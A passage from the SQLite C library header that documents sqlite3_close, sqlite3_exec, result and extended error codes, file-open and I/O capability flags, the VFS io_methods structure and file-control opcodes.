** host languages that are garbage collected, and where the order in which
** destructors are called is arbitrary.
**
** Applications should [sqlite3_finalize | finalize] all [prepared statements],
** [sqlite3_blob_close | close] all [BLOB handles], and 
** [sqlite3_backup_finish | finish] all [sqlite3_backup] objects associated
** with the [sqlite3] object prior to attempting to close the object.  ^If
** sqlite3_close_v2() is called on a [database connection] that still has
** outstanding [prepared statements], [BLOB handles], and/or
** [sqlite3_backup] objects then it returns [SQLITE_OK] and the deallocation
** of resources is deferred until all [prepared statements], [BLOB handles],
** and [sqlite3_backup] objects are also destroyed.
**
** ^If an [sqlite3] object is destroyed while a transaction is open,
** the transaction is automatically rolled back.
**
** The C parameter to [sqlite3_close(C)] and [sqlite3_close_v2(C)]
** must be either a NULL
** pointer or an [sqlite3] object pointer obtained
** from [sqlite3_open()], [sqlite3_open16()], or
** [sqlite3_open_v2()], and not previously closed.
** ^Calling sqlite3_close() or sqlite3_close_v2() with a NULL pointer
** argument is a harmless no-op.
*/
SQLITE_API int sqlite3_close(sqlite3*);
SQLITE_API int sqlite3_close_v2(sqlite3*);

/*
** The type for a callback function.
** This is legacy and deprecated.  It is included for historical
** compatibility and is not documented.
*/
typedef int (*sqlite3_callback)(void*,int,char**, char**);

/*
** CAPI3REF: One-Step Query Execution Interface
** METHOD: sqlite3
**
** The sqlite3_exec() interface is a convenience wrapper around
** [sqlite3_prepare_v2()], [sqlite3_step()], and [sqlite3_finalize()],
** that allows an application to run multiple statements of SQL
** without having to use a lot of C code. 
**
** ^The sqlite3_exec() interface runs zero or more UTF-8 encoded,
** semicolon-separate SQL statements passed into its 2nd argument,
** in the context of the [database connection] passed in as its 1st
** argument.  ^If the callback function of the 3rd argument to
** sqlite3_exec() is not NULL, then it is invoked for each result row
** coming out of the evaluated SQL statements.  ^The 4th argument to
** sqlite3_exec() is relayed through to the 1st argument of each
** callback invocation.  ^If the callback pointer to sqlite3_exec()
** is NULL, then no callback is ever invoked and result rows are
** ignored.
**
** ^If an error occurs while evaluating the SQL statements passed into
** sqlite3_exec(), then execution of the current statement stops and
** subsequent statements are skipped.  ^If the 5th parameter to sqlite3_exec()
** is not NULL then any error message is written into memory obtained
** from [sqlite3_malloc()] and passed back through the 5th parameter.
** To avoid memory leaks, the application should invoke [sqlite3_free()]
** on error message strings returned through the 5th parameter of
** sqlite3_exec() after the error message string is no longer needed.
** ^If the 5th parameter to sqlite3_exec() is not NULL and no errors
** occur, then sqlite3_exec() sets the pointer in its 5th parameter to
** NULL before returning.
**
** ^If an sqlite3_exec() callback returns non-zero, the sqlite3_exec()
** routine returns SQLITE_ABORT without invoking the callback again and
** without running any subsequent SQL statements.
**
** ^The 2nd argument to the sqlite3_exec() callback function is the
** number of columns in the result.  ^The 3rd argument to the sqlite3_exec()
** callback is an array of pointers to strings obtained as if from
** [sqlite3_column_text()], one for each column.  ^If an element of a
** result row is NULL then the corresponding string pointer for the
** sqlite3_exec() callback is a NULL pointer.  ^The 4th argument to the
** sqlite3_exec() callback is an array of pointers to strings where each
** entry represents the name of corresponding result column as obtained
** from [sqlite3_column_name()].
**
** ^If the 2nd parameter to sqlite3_exec() is a NULL pointer, a pointer
** to an empty string, or a pointer that contains only whitespace and/or 
** SQL comments, then no SQL statements are evaluated and the database
** is not changed.
**
** Restrictions:
**
** <ul>
** <li> The application must ensure that the 1st parameter to sqlite3_exec()
**      is a valid and open [database connection].
** <li> The application must not close the [database connection] specified by
**      the 1st parameter to sqlite3_exec() while sqlite3_exec() is running.
** <li> The application must not modify the SQL statement text passed into
**      the 2nd parameter of sqlite3_exec() while sqlite3_exec() is running.
** </ul>
*/
SQLITE_API int sqlite3_exec(
  sqlite3*,                                  /* An open database */
  const char *sql,                           /* SQL to be evaluated */
  int (*callback)(void*,int,char**,char**),  /* Callback function */
  void *,                                    /* 1st argument to callback */
  char **errmsg                              /* Error msg written here */
);

/*
** CAPI3REF: Result Codes
** KEYWORDS: {result code definitions}
**
** Many SQLite functions return an integer result code from the set shown
** here in order to indicate success or failure.
**
** New error codes may be added in future versions of SQLite.
**
** See also: [extended result code definitions]
*/
#define SQLITE_OK           0   /* Successful result */
/* beginning-of-error-codes */
#define SQLITE_ERROR        1   /* Generic error */
#define SQLITE_INTERNAL     2   /* Internal logic error in SQLite */
#define SQLITE_PERM         3   /* Access permission denied */
#define SQLITE_ABORT        4   /* Callback routine requested an abort */
#define SQLITE_BUSY         5   /* The database file is locked */
#define SQLITE_LOCKED       6   /* A table in the database is locked */
#define SQLITE_NOMEM        7   /* A malloc() failed */
#define SQLITE_READONLY     8   /* Attempt to write a readonly database */
#define SQLITE_INTERRUPT    9   /* Operation terminated by sqlite3_interrupt()*/
#define SQLITE_IOERR       10   /* Some kind of disk I/O error occurred */
#define SQLITE_CORRUPT     11   /* The database disk image is malformed */
#define SQLITE_NOTFOUND    12   /* Unknown opcode in sqlite3_file_control() */
#define SQLITE_FULL        13   /* Insertion failed because database is full */
#define SQLITE_CANTOPEN    14   /* Unable to open the database file */
#define SQLITE_PROTOCOL    15   /* Database lock protocol error */
#define SQLITE_EMPTY       16   /* Internal use only */
#define SQLITE_SCHEMA      17   /* The database schema changed */
#define SQLITE_TOOBIG      18   /* String or BLOB exceeds size limit */
#define SQLITE_CONSTRAINT  19   /* Abort due to constraint violation */
#define SQLITE_MISMATCH    20   /* Data type mismatch */
#define SQLITE_MISUSE      21   /* Library used incorrectly */
#define SQLITE_NOLFS       22   /* Uses OS features not supported on host */
#define SQLITE_AUTH        23   /* Authorization denied */
#define SQLITE_FORMAT      24   /* Not used */
#define SQLITE_RANGE       25   /* 2nd parameter to sqlite3_bind out of range */
#define SQLITE_NOTADB      26   /* File opened that is not a database file */
#define SQLITE_NOTICE      27   /* Notifications from sqlite3_log() */
#define SQLITE_WARNING     28   /* Warnings from sqlite3_log() */
#define SQLITE_ROW         100  /* sqlite3_step() has another row ready */
#define SQLITE_DONE        101  /* sqlite3_step() has finished executing */
/* end-of-error-codes */

/*
** CAPI3REF: Extended Result Codes
** KEYWORDS: {extended result code definitions}
**
** In its default configuration, SQLite API routines return one of 30 integer
** [result codes].  However, experience has shown that many of
** these result codes are too coarse-grained.  They do not provide as
** much information about problems as programmers might like.  In an effort to
** address this, newer versions of SQLite (version 3.3.8 [dateof:3.3.8]
** and later) include
** support for additional result codes that provide more detailed information
** about errors. These [extended result codes] are enabled or disabled
** on a per database connection basis using the
** [sqlite3_extended_result_codes()] API.  Or, the extended code for
** the most recent error can be obtained using
** [sqlite3_extended_errcode()].
*/
#define SQLITE_ERROR_MISSING_COLLSEQ   (SQLITE_ERROR | (1<<8))
#define SQLITE_ERROR_RETRY             (SQLITE_ERROR | (2<<8))
#define SQLITE_ERROR_SNAPSHOT          (SQLITE_ERROR | (3<<8))
#define SQLITE_IOERR_READ              (SQLITE_IOERR | (1<<8))
#define SQLITE_IOERR_SHORT_READ        (SQLITE_IOERR | (2<<8))
#define SQLITE_IOERR_WRITE             (SQLITE_IOERR | (3<<8))
#define SQLITE_IOERR_FSYNC             (SQLITE_IOERR | (4<<8))
#define SQLITE_IOERR_DIR_FSYNC         (SQLITE_IOERR | (5<<8))
#define SQLITE_IOERR_TRUNCATE          (SQLITE_IOERR | (6<<8))
#define SQLITE_IOERR_FSTAT             (SQLITE_IOERR | (7<<8))
#define SQLITE_IOERR_UNLOCK            (SQLITE_IOERR | (8<<8))
#define SQLITE_IOERR_RDLOCK            (SQLITE_IOERR | (9<<8))
#define SQLITE_IOERR_DELETE            (SQLITE_IOERR | (10<<8))
#define SQLITE_IOERR_BLOCKED           (SQLITE_IOERR | (11<<8))
#define SQLITE_IOERR_NOMEM             (SQLITE_IOERR | (12<<8))
#define SQLITE_IOERR_ACCESS            (SQLITE_IOERR | (13<<8))
#define SQLITE_IOERR_CHECKRESERVEDLOCK (SQLITE_IOERR | (14<<8))
#define SQLITE_IOERR_LOCK              (SQLITE_IOERR | (15<<8))
#define SQLITE_IOERR_CLOSE             (SQLITE_IOERR | (16<<8))
#define SQLITE_IOERR_DIR_CLOSE         (SQLITE_IOERR | (17<<8))
#define SQLITE_IOERR_SHMOPEN           (SQLITE_IOERR | (18<<8))
#define SQLITE_IOERR_SHMSIZE           (SQLITE_IOERR | (19<<8))
#define SQLITE_IOERR_SHMLOCK           (SQLITE_IOERR | (20<<8))
#define SQLITE_IOERR_SHMMAP            (SQLITE_IOERR | (21<<8))
#define SQLITE_IOERR_SEEK              (SQLITE_IOERR | (22<<8))
#define SQLITE_IOERR_DELETE_NOENT      (SQLITE_IOERR | (23<<8))
#define SQLITE_IOERR_MMAP              (SQLITE_IOERR | (24<<8))
#define SQLITE_IOERR_GETTEMPPATH       (SQLITE_IOERR | (25<<8))
#define SQLITE_IOERR_CONVPATH          (SQLITE_IOERR | (26<<8))
#define SQLITE_IOERR_VNODE             (SQLITE_IOERR | (27<<8))
#define SQLITE_IOERR_AUTH              (SQLITE_IOERR | (28<<8))
#define SQLITE_IOERR_BEGIN_ATOMIC      (SQLITE_IOERR | (29<<8))
#define SQLITE_IOERR_COMMIT_ATOMIC     (SQLITE_IOERR | (30<<8))
#define SQLITE_IOERR_ROLLBACK_ATOMIC   (SQLITE_IOERR | (31<<8))
#define SQLITE_LOCKED_SHAREDCACHE      (SQLITE_LOCKED |  (1<<8))
#define SQLITE_LOCKED_VTAB             (SQLITE_LOCKED |  (2<<8))
#define SQLITE_BUSY_RECOVERY           (SQLITE_BUSY   |  (1<<8))
#define SQLITE_BUSY_SNAPSHOT           (SQLITE_BUSY   |  (2<<8))
#define SQLITE_CANTOPEN_NOTEMPDIR      (SQLITE_CANTOPEN | (1<<8))
#define SQLITE_CANTOPEN_ISDIR          (SQLITE_CANTOPEN | (2<<8))
#define SQLITE_CANTOPEN_FULLPATH       (SQLITE_CANTOPEN | (3<<8))
#define SQLITE_CANTOPEN_CONVPATH       (SQLITE_CANTOPEN | (4<<8))
#define SQLITE_CANTOPEN_DIRTYWAL       (SQLITE_CANTOPEN | (5<<8)) /* Not Used */
#define SQLITE_CORRUPT_VTAB            (SQLITE_CORRUPT | (1<<8))
#define SQLITE_CORRUPT_SEQUENCE        (SQLITE_CORRUPT | (2<<8))
#define SQLITE_READONLY_RECOVERY       (SQLITE_READONLY | (1<<8))
#define SQLITE_READONLY_CANTLOCK       (SQLITE_READONLY | (2<<8))
#define SQLITE_READONLY_ROLLBACK       (SQLITE_READONLY | (3<<8))
#define SQLITE_READONLY_DBMOVED        (SQLITE_READONLY | (4<<8))
#define SQLITE_READONLY_CANTINIT       (SQLITE_READONLY | (5<<8))
#define SQLITE_READONLY_DIRECTORY      (SQLITE_READONLY | (6<<8))
#define SQLITE_ABORT_ROLLBACK          (SQLITE_ABORT | (2<<8))
#define SQLITE_CONSTRAINT_CHECK        (SQLITE_CONSTRAINT | (1<<8))
#define SQLITE_CONSTRAINT_COMMITHOOK   (SQLITE_CONSTRAINT | (2<<8))
#define SQLITE_CONSTRAINT_FOREIGNKEY   (SQLITE_CONSTRAINT | (3<<8))
#define SQLITE_CONSTRAINT_FUNCTION     (SQLITE_CONSTRAINT | (4<<8))
#define SQLITE_CONSTRAINT_NOTNULL      (SQLITE_CONSTRAINT | (5<<8))
#define SQLITE_CONSTRAINT_PRIMARYKEY   (SQLITE_CONSTRAINT | (6<<8))
#define SQLITE_CONSTRAINT_TRIGGER      (SQLITE_CONSTRAINT | (7<<8))
#define SQLITE_CONSTRAINT_UNIQUE       (SQLITE_CONSTRAINT | (8<<8))
#define SQLITE_CONSTRAINT_VTAB         (SQLITE_CONSTRAINT | (9<<8))
#define SQLITE_CONSTRAINT_ROWID        (SQLITE_CONSTRAINT |(10<<8))
#define SQLITE_NOTICE_RECOVER_WAL      (SQLITE_NOTICE | (1<<8))
#define SQLITE_NOTICE_RECOVER_ROLLBACK (SQLITE_NOTICE | (2<<8))
#define SQLITE_WARNING_AUTOINDEX       (SQLITE_WARNING | (1<<8))
#define SQLITE_AUTH_USER               (SQLITE_AUTH | (1<<8))
#define SQLITE_OK_LOAD_PERMANENTLY     (SQLITE_OK | (1<<8))

/*
** CAPI3REF: Flags For File Open Operations
**
** These bit values are intended for use in the
** 3rd parameter to the [sqlite3_open_v2()] interface and
** in the 4th parameter to the [sqlite3_vfs.xOpen] method.
*/
#define SQLITE_OPEN_READONLY         0x00000001  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_READWRITE        0x00000002  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_CREATE           0x00000004  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_DELETEONCLOSE    0x00000008  /* VFS only */
#define SQLITE_OPEN_EXCLUSIVE        0x00000010  /* VFS only */
#define SQLITE_OPEN_AUTOPROXY        0x00000020  /* VFS only */
#define SQLITE_OPEN_URI              0x00000040  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_MEMORY           0x00000080  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_MAIN_DB          0x00000100  /* VFS only */
#define SQLITE_OPEN_TEMP_DB          0x00000200  /* VFS only */
#define SQLITE_OPEN_TRANSIENT_DB     0x00000400  /* VFS only */
#define SQLITE_OPEN_MAIN_JOURNAL     0x00000800  /* VFS only */
#define SQLITE_OPEN_TEMP_JOURNAL     0x00001000  /* VFS only */
#define SQLITE_OPEN_SUBJOURNAL       0x00002000  /* VFS only */
#define SQLITE_OPEN_MASTER_JOURNAL   0x00004000  /* VFS only */
#define SQLITE_OPEN_NOMUTEX          0x00008000  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_FULLMUTEX        0x00010000  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_SHAREDCACHE      0x00020000  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_PRIVATECACHE     0x00040000  /* Ok for sqlite3_open_v2() */
#define SQLITE_OPEN_WAL              0x00080000  /* VFS only */

/* Reserved:                         0x00F00000 */

/*
** CAPI3REF: Device Characteristics
**
** The xDeviceCharacteristics method of the [sqlite3_io_methods]
** object returns an integer which is a vector of these
** bit values expressing I/O characteristics of the mass storage
** device that holds the file that the [sqlite3_io_methods]
** refers to.
**
** The SQLITE_IOCAP_ATOMIC property means that all writes of
** any size are atomic.  The SQLITE_IOCAP_ATOMICnnn values
** mean that writes of blocks that are nnn bytes in size and
** are aligned to an address which is an integer multiple of
** nnn are atomic.  The SQLITE_IOCAP_SAFE_APPEND value means
** that when data is appended to a file, the data is appended
** first then the size of the file is extended, never the other
** way around.  The SQLITE_IOCAP_SEQUENTIAL property means that
** information is written to disk in the same order as calls
** to xWrite().  The SQLITE_IOCAP_POWERSAFE_OVERWRITE property means that
** after reboot following a crash or power loss, the only bytes in a
** file that were written at the application level might have changed
** and that adjacent bytes, even bytes within the same sector are
** guaranteed to be unchanged.  The SQLITE_IOCAP_UNDELETABLE_WHEN_OPEN
** flag indicates that a file cannot be deleted when open.  The
** SQLITE_IOCAP_IMMUTABLE flag indicates that the file is on
** read-only media and cannot be changed even by processes with
** elevated privileges.
**
** The SQLITE_IOCAP_BATCH_ATOMIC property means that the underlying
** filesystem supports doing multiple write operations atomically when those
** write operations are bracketed by [SQLITE_FCNTL_BEGIN_ATOMIC_WRITE] and
** [SQLITE_FCNTL_COMMIT_ATOMIC_WRITE].
*/
#define SQLITE_IOCAP_ATOMIC                 0x00000001
#define SQLITE_IOCAP_ATOMIC512              0x00000002
#define SQLITE_IOCAP_ATOMIC1K               0x00000004
#define SQLITE_IOCAP_ATOMIC2K               0x00000008
#define SQLITE_IOCAP_ATOMIC4K               0x00000010
#define SQLITE_IOCAP_ATOMIC8K               0x00000020
#define SQLITE_IOCAP_ATOMIC16K              0x00000040
#define SQLITE_IOCAP_ATOMIC32K              0x00000080
#define SQLITE_IOCAP_ATOMIC64K              0x00000100
#define SQLITE_IOCAP_SAFE_APPEND            0x00000200
#define SQLITE_IOCAP_SEQUENTIAL             0x00000400
#define SQLITE_IOCAP_UNDELETABLE_WHEN_OPEN  0x00000800
#define SQLITE_IOCAP_POWERSAFE_OVERWRITE    0x00001000
#define SQLITE_IOCAP_IMMUTABLE              0x00002000
#define SQLITE_IOCAP_BATCH_ATOMIC           0x00004000

/*
** CAPI3REF: File Locking Levels
**
** SQLite uses one of these integer values as the second
** argument to calls it makes to the xLock() and xUnlock() methods
** of an [sqlite3_io_methods] object.
*/
#define SQLITE_LOCK_NONE          0
#define SQLITE_LOCK_SHARED        1
#define SQLITE_LOCK_RESERVED      2
#define SQLITE_LOCK_PENDING       3
#define SQLITE_LOCK_EXCLUSIVE     4

/*
** CAPI3REF: Synchronization Type Flags
**
** When SQLite invokes the xSync() method of an
** [sqlite3_io_methods] object it uses a combination of
** these integer values as the second argument.
**
** When the SQLITE_SYNC_DATAONLY flag is used, it means that the
** sync operation only needs to flush data to mass storage.  Inode
** information need not be flushed. If the lower four bits of the flag
** equal SQLITE_SYNC_NORMAL, that means to use normal fsync() semantics.
** If the lower four bits equal SQLITE_SYNC_FULL, that means
** to use Mac OS X style fullsync instead of fsync().
**
** Do not confuse the SQLITE_SYNC_NORMAL and SQLITE_SYNC_FULL flags
** with the [PRAGMA synchronous]=NORMAL and [PRAGMA synchronous]=FULL
** settings.  The [synchronous pragma] determines when calls to the
** xSync VFS method occur and applies uniformly across all platforms.
** The SQLITE_SYNC_NORMAL and SQLITE_SYNC_FULL flags determine how
** energetic or rigorous or forceful the sync operations are and
** only make a difference on Mac OSX for the default SQLite code.
** (Third-party VFS implementations might also make the distinction
** between SQLITE_SYNC_NORMAL and SQLITE_SYNC_FULL, but among the
** operating systems natively supported by SQLite, only Mac OSX
** cares about the difference.)
*/
#define SQLITE_SYNC_NORMAL        0x00002
#define SQLITE_SYNC_FULL          0x00003
#define SQLITE_SYNC_DATAONLY      0x00010

/*
** CAPI3REF: OS Interface Open File Handle
**
** An [sqlite3_file] object represents an open file in the 
** [sqlite3_vfs | OS interface layer].  Individual OS interface
** implementations will
** want to subclass this object by appending additional fields
** for their own use.  The pMethods entry is a pointer to an
** [sqlite3_io_methods] object that defines methods for performing
** I/O operations on the open file.
*/
typedef struct sqlite3_file sqlite3_file;
struct sqlite3_file {
  const struct sqlite3_io_methods *pMethods;  /* Methods for an open file */
};

/*
** CAPI3REF: OS Interface File Virtual Methods Object
**
** Every file opened by the [sqlite3_vfs.xOpen] method populates an
** [sqlite3_file] object (or, more commonly, a subclass of the
** [sqlite3_file] object) with a pointer to an instance of this object.
** This object defines the methods used to perform various operations
** against the open file represented by the [sqlite3_file] object.
**
** If the [sqlite3_vfs.xOpen] method sets the sqlite3_file.pMethods element 
** to a non-NULL pointer, then the sqlite3_io_methods.xClose method
** may be invoked even if the [sqlite3_vfs.xOpen] reported that it failed.  The
** only way to prevent a call to xClose following a failed [sqlite3_vfs.xOpen]
** is for the [sqlite3_vfs.xOpen] to set the sqlite3_file.pMethods element
** to NULL.
**
** The flags argument to xSync may be one of [SQLITE_SYNC_NORMAL] or
** [SQLITE_SYNC_FULL].  The first choice is the normal fsync().
** The second choice is a Mac OS X style fullsync.  The [SQLITE_SYNC_DATAONLY]
** flag may be ORed in to indicate that only the data of the file
** and not its inode needs to be synced.
**
** The integer values to xLock() and xUnlock() are one of
** <ul>
** <li> [SQLITE_LOCK_NONE],
** <li> [SQLITE_LOCK_SHARED],
** <li> [SQLITE_LOCK_RESERVED],
** <li> [SQLITE_LOCK_PENDING], or
** <li> [SQLITE_LOCK_EXCLUSIVE].
** </ul>
** xLock() increases the lock. xUnlock() decreases the lock.
** The xCheckReservedLock() method checks whether any database connection,
** either in this process or in some other process, is holding a RESERVED,
** PENDING, or EXCLUSIVE lock on the file.  It returns true
** if such a lock exists and false otherwise.
**
** The xFileControl() method is a generic interface that allows custom
** VFS implementations to directly control an open file using the
** [sqlite3_file_control()] interface.  The second "op" argument is an
** integer opcode.  The third argument is a generic pointer intended to
** point to a structure that may contain arguments or space in which to
** write return values.  Potential uses for xFileControl() might be
** functions to enable blocking locks with timeouts, to change the
** locking strategy (for example to use dot-file locks), to inquire
** about the status of a lock, or to break stale locks.  The SQLite
** core reserves all opcodes less than 100 for its own use.
** A [file control opcodes | list of opcodes] less than 100 is available.
** Applications that define a custom xFileControl method should use opcodes
** greater than 100 to avoid conflicts.  VFS implementations should
** return [SQLITE_NOTFOUND] for file control opcodes that they do not
** recognize.
**
** The xSectorSize() method returns the sector size of the
** device that underlies the file.  The sector size is the
** minimum write that can be performed without disturbing
** other bytes in the file.  The xDeviceCharacteristics()
** method returns a bit vector describing behaviors of the
** underlying device:
**
** <ul>
** <li> [SQLITE_IOCAP_ATOMIC]
** <li> [SQLITE_IOCAP_ATOMIC512]
** <li> [SQLITE_IOCAP_ATOMIC1K]
** <li> [SQLITE_IOCAP_ATOMIC2K]
** <li> [SQLITE_IOCAP_ATOMIC4K]
** <li> [SQLITE_IOCAP_ATOMIC8K]
** <li> [SQLITE_IOCAP_ATOMIC16K]
** <li> [SQLITE_IOCAP_ATOMIC32K]
** <li> [SQLITE_IOCAP_ATOMIC64K]
** <li> [SQLITE_IOCAP_SAFE_APPEND]
** <li> [SQLITE_IOCAP_SEQUENTIAL]
** <li> [SQLITE_IOCAP_UNDELETABLE_WHEN_OPEN]
** <li> [SQLITE_IOCAP_POWERSAFE_OVERWRITE]
** <li> [SQLITE_IOCAP_IMMUTABLE]
** <li> [SQLITE_IOCAP_BATCH_ATOMIC]
** </ul>
**
** The SQLITE_IOCAP_ATOMIC property means that all writes of
** any size are atomic.  The SQLITE_IOCAP_ATOMICnnn values
** mean that writes of blocks that are nnn bytes in size and
** are aligned to an address which is an integer multiple of
** nnn are atomic.  The SQLITE_IOCAP_SAFE_APPEND value means
** that when data is appended to a file, the data is appended
** first then the size of the file is extended, never the other
** way around.  The SQLITE_IOCAP_SEQUENTIAL property means that
** information is written to disk in the same order as calls
** to xWrite().
**
** If xRead() returns SQLITE_IOERR_SHORT_READ it must also fill
** in the unread portions of the buffer with zeros.  A VFS that
** fails to zero-fill short reads might seem to work.  However,
** failure to zero-fill short reads will eventually lead to
** database corruption.
*/
typedef struct sqlite3_io_methods sqlite3_io_methods;
struct sqlite3_io_methods {
  int iVersion;
  int (*xClose)(sqlite3_file*);
  int (*xRead)(sqlite3_file*, void*, int iAmt, sqlite3_int64 iOfst);
  int (*xWrite)(sqlite3_file*, const void*, int iAmt, sqlite3_int64 iOfst);
  int (*xTruncate)(sqlite3_file*, sqlite3_int64 size);
  int (*xSync)(sqlite3_file*, int flags);
  int (*xFileSize)(sqlite3_file*, sqlite3_int64 *pSize);
  int (*xLock)(sqlite3_file*, int);
  int (*xUnlock)(sqlite3_file*, int);
  int (*xCheckReservedLock)(sqlite3_file*, int *pResOut);
  int (*xFileControl)(sqlite3_file*, int op, void *pArg);
  int (*xSectorSize)(sqlite3_file*);
  int (*xDeviceCharacteristics)(sqlite3_file*);
  /* Methods above are valid for version 1 */
  int (*xShmMap)(sqlite3_file*, int iPg, int pgsz, int, void volatile**);
  int (*xShmLock)(sqlite3_file*, int offset, int n, int flags);
  void (*xShmBarrier)(sqlite3_file*);
  int (*xShmUnmap)(sqlite3_file*, int deleteFlag);
  /* Methods above are valid for version 2 */
  int (*xFetch)(sqlite3_file*, sqlite3_int64 iOfst, int iAmt, void **pp);
  int (*xUnfetch)(sqlite3_file*, sqlite3_int64 iOfst, void *p);
  /* Methods above are valid for version 3 */
  /* Additional methods may be added in future releases */
};

/*
** CAPI3REF: Standard File Control Opcodes
** KEYWORDS: {file control opcodes} {file control opcode}
**
** These integer constants are opcodes for the xFileControl method
** of the [sqlite3_io_methods] object and for the [sqlite3_file_control()]
** interface.
**
** <ul>
** <li>[[SQLITE_FCNTL_LOCKSTATE]]
** The [SQLITE_FCNTL_LOCKSTATE] opcode is used for debugging.  This
** opcode causes the xFileControl method to write the current state of
** the lock (one of [SQLITE_LOCK_NONE], [SQLITE_LOCK_SHARED],
** [SQLITE_LOCK_RESERVED], [SQLITE_LOCK_PENDING], or [SQLITE_LOCK_EXCLUSIVE])
** into an integer that the pArg argument points to. This capability
** is used during testing and is only available when the SQLITE_TEST
** compile-time option is used.
**
** <li>[[SQLITE_FCNTL_SIZE_HINT]]
** The [SQLITE_FCNTL_SIZE_HINT] opcode is used by SQLite to give the VFS
** layer a hint of how large the database file will grow to be during the
** current transaction.  This hint is not guaranteed to be accurate but it
** is often close.  The underlying VFS might choose to preallocate database
** file space based on this hint in order to help writes to the database
** file run faster.
**
** <li>[[SQLITE_FCNTL_SIZE_LIMIT]]
** The [SQLITE_FCNTL_SIZE_LIMIT] opcode is used by in-memory VFS that
** implements [sqlite3_deserialize()] to set an upper bound on the size
** of the in-memory database.  The argument is a pointer to a [sqlite3_int64].
** If the integer pointed to is negative, then it is filled in with the
** current limit.  Otherwise the limit is set to the larger of the value
** of the integer pointed to and the current database size.  The integer
** pointed to is set to the new limit.
**
** <li>[[SQLITE_FCNTL_CHUNK_SIZE]]
** The [SQLITE_FCNTL_CHUNK_SIZE] opcode is used to request that the VFS
** extends and truncates the database file in chunks of a size specified
** by the user. The fourth argument to [sqlite3_file_control()] should 
** point to an integer (type int) containing the new chunk-size to use
** for the nominated database. Allocating database file space in large
** chunks (say 1MB at a time), may reduce file-system fragmentation and
** improve performance on some systems.
**
** <li>[[SQLITE_FCNTL_FILE_POINTER]]
** The [SQLITE_FCNTL_FILE_POINTER] opcode is used to obtain a pointer
** to the [sqlite3_file] object associated with a particular database
** connection.  See also [SQLITE_FCNTL_JOURNAL_POINTER].
**
** <li>[[SQLITE_FCNTL_JOURNAL_POINTER]]
** The [SQLITE_FCNTL_JOURNAL_POINTER] opcode is used to obtain a pointer
** to the [sqlite3_file] object associated with the journal file (either
** the [rollback journal] or the [write-ahead log]) for a particular database
** connection.  See also [SQLITE_FCNTL_FILE_POINTER].
**
** <li>[[SQLITE_FCNTL_SYNC_OMITTED]]
** No longer in use.
**
** <li>[[SQLITE_FCNTL_SYNC]]
** The [SQLITE_FCNTL_SYNC] opcode is generated internally by SQLite and
** sent to the VFS immediately before the xSync method is invoked on a
** database file descriptor. Or, if the xSync method is not invoked 
** because the user has configured SQLite with 
** [PRAGMA synchronous | PRAGMA synchronous=OFF] it is invoked in place 
** of the xSync method. In most cases, the pointer argument passed with
** this file-control is NULL. However, if the database file is being synced
** as part of a multi-database commit, the argument points to a nul-terminated
** string containing the transactions master-journal file name. VFSes that 
** do not need this signal should silently ignore this opcode. Applications 
** should not call [sqlite3_file_control()] with this opcode as doing so may 
** disrupt the operation of the specialized VFSes that do require it.  
**
** <li>[[SQLITE_FCNTL_COMMIT_PHASETWO]]
** The [SQLITE_FCNTL_COMMIT_PHASETWO] opcode is generated internally by SQLite
** and sent to the VFS after a transaction has been committed immediately
** but before the database is unlocked. VFSes that do not need this signal
** should silently ignore this opcode. Applications should not call
** [sqlite3_file_control()] with this opcode as doing so may disrupt the 
** operation of the specialized VFSes that do require it.  
**
** <li>[[SQLITE_FCNTL_WIN32_AV_RETRY]]
** ^The [SQLITE_FCNTL_WIN32_AV_RETRY] opcode is used to configure automatic
** retry counts and intervals for certain disk I/O operations for the
** windows [VFS] in order to provide robustness in the presence of
** anti-virus programs.  By default, the windows VFS will retry file read,
** file write, and file delete operations up to 10 times, with a delay
** of 25 milliseconds before the first retry and with the delay increasing
** by an additional 25 milliseconds with each subsequent retry.  This
** opcode allows these two values (10 retries and 25 milliseconds of delay)
** to be adjusted.  The values are changed for all database connections
** within the same process.  The argument is a pointer to an array of two
** integers where the first integer is the new retry count and the second
** integer is the delay.  If either integer is negative, then the setting
** is not changed but instead the prior value of that setting is written
** into the array entry, allowing the current retry settings to be
** interrogated.  The zDbName parameter is ignored.
**
** <li>[[SQLITE_FCNTL_PERSIST_WAL]]
** ^The [SQLITE_FCNTL_PERSIST_WAL] opcode is used to set or query the
** persistent [WAL | Write Ahead Log] setting.  By default, the auxiliary
** write ahead log ([WAL file]) and shared memory
** files used for transaction control
** are automatically deleted when the latest connection to the database
** closes.  Setting persistent WAL mode causes those files to persist after
** close.  Persisting the files is useful when other processes that do not
** have write permission on the directory containing the database file want
** to read the database file, as the WAL and shared memory files must exist
** in order for the database to be readable.  The fourth parameter to
** [sqlite3_file_control()] for this opcode should be a pointer to an integer.
** That integer is 0 to disable persistent WAL mode or 1 to enable persistent
** WAL mode.  If the integer is -1, then it is overwritten with the current
** WAL persistence setting.
**
** <li>[[SQLITE_FCNTL_POWERSAFE_OVERWRITE]]
** ^The [SQLITE_FCNTL_POWERSAFE_OVERWRITE] opcode is used to set or query the
** persistent "powersafe-overwrite" or "PSOW" setting.  The PSOW setting
** determines the [SQLITE_IOCAP_POWERSAFE_OVERWRITE] bit of the
** xDeviceCharacteristics methods. The fourth parameter to
** [sqlite3_file_control()] for this opcode should be a pointer to an integer.
** That integer is 0 to disable zero-damage mode or 1 to enable zero-damage
** mode.  If the integer is -1, then it is overwritten with the current
** zero-damage mode setting.
**
** <li>[[SQLITE_FCNTL_OVERWRITE]]
** ^The [SQLITE_FCNTL_OVERWRITE] opcode is invoked by SQLite after opening
** a write transaction to indicate that, unless it is rolled back for some
** reason, the entire database file will be overwritten by the current 
** transaction. This is used by VACUUM operations.
**
** <li>[[SQLITE_FCNTL_VFSNAME]]
** ^The [SQLITE_FCNTL_VFSNAME] opcode can be used to obtain the names of
** all [VFSes] in the VFS stack.  The names are of all VFS shims and the
** final bottom-level VFS are written into memory obtained from 
** [sqlite3_malloc()] and the result is stored in the char* variable
** that the fourth parameter of [sqlite3_file_control()] points to.
** The caller is responsible for freeing the memory when done.  As with
** all file-control actions, there is no guarantee that this will actually
** do anything.  Callers should initialize the char* variable to a NULL
** pointer in case this file-control is not implemented.  This file-control
** is intended for diagnostic use only.
**
